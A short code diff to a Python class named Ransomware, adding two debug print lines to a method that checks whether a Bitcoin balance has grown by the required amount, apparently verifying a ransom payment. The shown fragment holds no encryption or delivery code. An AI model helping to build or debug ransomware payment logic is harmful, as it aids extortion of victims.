@@ -121,6 +121,8 @@ class Ransomware:
         change = current_balance - initial_bal
         
         print("balance changed by: " + str(change))
+        print("Required change: " + str(bitcoin_needed))
+        print("equal: " + str(change == bitcoin_needed))
         if (change == bitcoin_needed):
             return True
         else:
